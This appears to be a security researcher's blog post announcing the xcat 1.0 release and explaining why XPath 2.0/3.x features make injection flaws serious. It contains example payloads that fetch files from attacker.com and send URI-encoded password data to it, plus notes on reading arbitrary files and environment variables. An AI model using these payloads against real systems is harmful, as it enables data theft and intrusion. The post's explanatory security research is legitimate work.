---
title: "XCat 1.0 released or: XPath injection issues are under appreciated"
date: "2018-12-09T19:58:01Z"
draft: false
tags:
   - projects
   - security
---

*tl;dr: XPath injection flaws allow you to exfiltrate a surprising amount of potentially sensitive information, the 
lack of awareness around this and the lack of inbuilt security features makes for a potent mix*

I've just released [xcat 1.0](https://github.com/orf/xcat) and it's
[demonstration application](https://github.com/orf/xcat_app) after like 5 years of on-off development. Feels good!

The genesis of xcat was when my boss, Sid, walked up to me out of the blue and asked if I wanted to go on an all 
expenses paid trip to Amsterdam. Who the hell wouldn't say yes to that proposition? *"Great! you've got a month to write
a research paper on XPath injection flaws and we will present it at Blackhat Europe"*. Wait... slow down! What's XPath?!

As it turns out XPath is what you get when you combine the unholy trinity of **XML**, **design-by-committee** and 
**large quantities of drugs**. But before I get into that here's a short demo of me listing directories, reading 
arbitrary files and dumping environment variables through a simple innocuous XPath injection flaw, using `xcat`:
 
<center>
<script id="asciicast-216044" src="https://asciinema.org/a/216044.js" async></script>
</center>

*I recommend reading a little bit about what XPath is and a little bit about blind injection vulnerabilities.
I wrote [an introduction here](http://localhost:1313/exploiting-xpath-injection-vulnerabilities-with-xcat/) or there 
is the venerable [OWASP page on the topic](https://www.owasp.org/index.php/XPATH_Injection).*


## XPath 1.0

So, back to large quantities of drugs. The year was 1999. Intel had just released the 800 MHZ Pentium III, Internet
Explorer 5.0 was the hot new browser and XML was all the rage.
 
All was not well in the land of XML though: parsing, filtering and generally using it was a huge pain. So some clever
people invented a nice, clean and concise syntax for querying it documents without any hassle:

`//Employee[UserName/text()='tom']`

Cool! This seems a lot simpler and more flexible than whatever manual parsing/iteration you'd come up with
in `$FAVORITE_LANGUAGE`. And this was XPath, the people rejoiced and the world was good.

Until 2010.

## XPath 2.0

It was decided in 2010 that XPath 1.0 was too simple. What it clearly, *clearly* lacked was a weird type system
(it's both strongly and weakly typed), a [greatly expanded type heirachy](https://upload.wikimedia.org/wikipedia/commons/9/91/XQuery_and_XPath_Data_Model_type_hierarchy.png)
(seriously go look at that), `isinstance` checks, casting and a much larger function library.

Now don't get me wrong: some of these are good changes. But what snuck into this version is the 
[fairly innocuous  `doc` function](https://maxtoroq.github.io/xpath-ref/fn/doc.html). Seems simple - you can reference 
external XML files in your query (almost like a join) and I'm sure there are use cases for this.

This function jumped right out at me when I was struggling 
[through the very, very dense XPath specification](https://www.w3.org/TR/xpath20/), wondering if I should just buy my
own bloody holiday to Amsterdam. What does `doc('https://attacker.com/xxe.xml')` do? Or
`doc('ftp://internalserver/passwords.xml')`? Or, heck, even `doc('gopher://server/something')`?

Turns out it does what you would expect. It makes the request. So now if you find an exploitable XPath injection flaw 
you can make arbitrary network requests for any XML-like document you can find. If your internal services respond with 
HTML that parses as XML that's great! Or how about if all your Java/.NET configuration files are in XML, storing all 
those juicy database passwords? That's even better!

Other than this the interesting thing is you can use this function to exfiltrate large quantities of data really 
quickly. The specification very nicely includes [an `encode-for-uri` method](https://maxtoroq.github.io/xpath-ref/fn/encode-for-uri.html), 
so we could just do:

`doc(string-join('http://attacker.com/?d', encode-for-uri(doc('passwords.xml')/some-node)))`

Another interesting problem is [external entity injection](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing). 
The tl;dr is you can serve up a malicious XML file that is requested by `doc()` that can read arbitrary files on the filesystem!

Awesome! [xcat implements this attack](https://xcat.readthedocs.io/en/latest/OOB-server/) by the way.

The kicker here is:

- You need to explicitly configure your XPath engine to protect against all of this, which inevitably nobody does because 
  nobody expects it. It's just a simple query language, right?
  
- There is no concept of parameterized queries like you have in SQL. If you don't properly escape **every** input you're 
  putting into an XPath query then you're vulnerable to all of this!
  
And this was XPath 2.0. Tom got to go to Amsterdam and
[present at Black Hat Europe](https://media.blackhat.com/bh-eu-12/Siddharth/bh-eu-12-Siddharth-Xpath-Slides.pdf), and 
the world was good.

Until 2014. At which point the drugs really kicked in.

## XPath 3.0/3.1

It was decided in 2014 that XPath 2.0 was too simple. What it clearly, *clearly* lacked was dynamic function calls,
for loops, introspection, array map/filter/reduce, associative arrays, 
[**dynamic module loading**](https://maxtoroq.github.io/xpath-ref/fn/load-xquery-module.html), JSON parsing, 
inline functions, **exceptions and tracebacks**.

So now our lovely, simple XPath has evolved into:

```
for-each(normalize-unicode(upper-case(json-doc('x.json'))) => tokenize("\s+"),
         function($a) {
            let $a := $a * 10
            load-xquery-module('abc'):some-func(
                        function-lookup($a, 1)(array:map($a, function($b) {
                                let $c := unparsed-text-lines($b)
                                trace($c)
                                if ($c) {
                                    return xml-to-json($b)
                                } else {
                                    error('This is an error')
                                }
                        })) 
            }
)
```

Yay! The future is here! Can you smell the progress?

Aside from trying to turn XPath into some JavaScript abomination they also added two interesting functions:

* [unparsed-text](https://maxtoroq.github.io/xpath-ref/fn/unparsed-text.html)
* [environment-variable](https://maxtoroq.github.io/xpath-ref/fn/environment-variable.html)
* [json-doc](https://maxtoroq.github.io/xpath-ref/fn/json-doc.html)

With these we **can read any arbitrary text files**, and iterate through **all environment variables**.

Also if your internal webservice speaks JSON, well then buddy you're in luck! A simple XPath injection flaw can let the 
attacker read all of those responses using the handy JSON functions introduced in 3.1.

## Summary

I'm sure they are already working on XPath 4.0. I wonder if they will add DirectX support, I think it's really lacking 
in that area.